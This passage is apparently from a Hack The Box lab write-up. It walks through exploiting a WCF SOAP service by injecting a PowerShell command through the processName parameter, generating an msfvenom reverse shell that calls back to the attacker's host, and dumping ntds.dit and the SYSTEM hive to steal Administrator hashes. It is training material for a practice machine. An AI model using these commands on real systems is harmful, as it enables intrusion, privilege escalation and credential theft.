The presence of the ?wsdl parameter is important. WSDL stands for Web Services Description Language and is only exposed by SOAP web services. This immediately tells us that this endpoint is not a normal web application but a WCF SOAP service.

SOAP stands for Simple Object Access Protocol. It is a protocol where remote functions are called by sending XML data over HTTP. Instead of clicking buttons or submitting forms, the client sends an XML document that tells the server which function to execute and with what arguments.

If we follow the links (while replacing overwatch.htb with 240.0.0.1)

http://240.0.0.1:8000/MonitorService?wsdl
http://240.0.0.1:8000/MonitorService?singleWsdl

the server responds with XML containing tags such as:

<wsdl:definitions>
<soap:binding>
<soap:operation>

These tags are specific to SOAP and confirm that this service is a SOAP endpoint implemented using WCF (Windows Communication Foundation). WCF is Microsoft’s framework for exposing C# methods over the network using protocols such as SOAP.

Crafting the XML payload​

1. The SOAP envelope:​

<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">

This is mandatory for all SOAP 1.1 requests.

  • Envelope means “this is a SOAP message”
  • The namespace http://schemas.xmlsoap.org/soap/envelope/ is fixed and never changes
  • If this is missing, the server rejects the request

2. The SOAP body​

<soap:Body>

The body contains the actual function call. SOAP envelopes can also have headers, but this service does not require any, so only the body is used.

3. The function call element​

<KillProcess xmlns="http://tempuri.org/">

This line is derived directly from the WSDL.

  • KillProcess comes from:

    <wsdl:operation name="KillProcess">

  • The namespace http://tempuri.org/ comes from:

    targetNamespace="http://tempuri.org/"

This element name must exactly match the operation name in the WSDL. If it does not, the service will not know which method to invoke.

4. The parameter element​

<processName>

This comes from the XML schema in the WSDL:

<xs:element name="processName"type="xs:string"/>

This tells us:

  • The parameter name is processName
  • The value must be a string
  • It must be inside the KillProcess element

SOAP does name-based parameter binding. Order and spelling matter.

5. The injected payload​

foo; <our payload here> #

This is just the value of the string parameter. SOAP does not care what the string contains. The vulnerability happens later when this string is concatenated into a PowerShell command without sanitization.

Finally, let’s end this all with closing tags and get the final malicious XML:

<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <KillProcess xmlns="http://tempuri.org/">
      <processName>
foo; < payload > #
      </processName>
    </KillProcess>
  </soap:Body>
</soap:Envelope>

Now we still need a payload. Personally I tried quite a few reverse shell payloads with no luck. There is however another way. We can use msfvenom to create a payload, upload it using evil-winrm-py and trigger it through the XML we just crafted.

Generating the final payload​

Let’s get our msfvenom binary:

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.129 \ # Or use meterpreter
LPORT=4444 -f exe -o shell.exe

This will give us the file, shell.exe . Now, let’s upload it with evil-winrm-py :

evil-winrm-py PS C:\Users\sqlmgmt\Desktop> upload shell.exe .
Uploading /home/kali/Desktop/HTB/Machines/Medium/Overwatch/shell.exe: 100%|█| 7.50k/7.50k [00:00<00:00,
[+] File uploaded successfully as: C:\Users\sqlmgmt\Desktop\shell.exe

Save this to a file like exploit.xml :

<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <KillProcess xmlns="http://tempuri.org/">
      <processName>
foo; Start-Process "C:\Users\sqlmgmt\shell.exe" #
      </processName>
    </KillProcess>
  </soap:Body>
</soap:Envelope>

Start the listener:

penelope

And finally, run the function with the XML:

┌──(kali㉿kali)-[~/…/HTB/Machines/Medium/Overwatch]
└─$ curl -X POST http://240.0.0.1:8000/MonitorService \                   
  -H 'Content-Type: text/xml; charset=utf-8' \
  -H 'SOAPAction: "http://tempuri.org/IMonitoringService/KillProcess"' \
  -d @exploit.xml

Through this we send a POST request to /MonitorService with the contents of exploit.xml as the data, while setting the content type to XML (since that is what SOAP needs) and also specifying the method we want to invoke. The value for the SOAPAction header is taken directly from the WSDL: soapAction="http://tempuri.org/IMonitoringService/KillProcess".

If we run this, we’re going to get a connection on our listener as NT Authority, and we can read the root flag on C:\Users\Administrator\Desktop\root.txt

Beyond root​

Gaining Admin’s credentials​

Let’s get Administrator’s hash. For that we could get the ntds.dit and SYSTEM files to our system and use impacket’s secretsdump . First, let’s create a snapshot of ntds in C:\temp

ntdsutil "activate instance ntds" "ifm" "create full C:\temp" quit quit
  • ntdsutil - Launches the ntdsutil.exe program
  • "activate instance ntds" - Selects the main AD instance (ntds = NT Directory Services)
  • "ifm" - Enters the "Install From Media" submenu
  • "create full C:\temp" - Creates a full backup to C:\temp folder
  • quit quit - Exits IFM menu, then exits ntdsutil (two quits for two menu levels)

We can’t access ntds.dit and the SYSTEM hive normally since it is constantly locked by the lsass.exe process. Now however there’s a snapshot of them inside C:\temp and we can copy them to a location we have access to with sqlmgmt so that we can use evil-winrm-py to download them:

copy "C:\temp\Active Directory\ntds.dit" C:\Users\sqlmgmt
copy C:\temp\registry\SYSTEM C:\Users\sqlmgmt

Then log in with evil-winrm-py as sqlmgmt and download them:

download ntds.dit .
download SYSTEM .
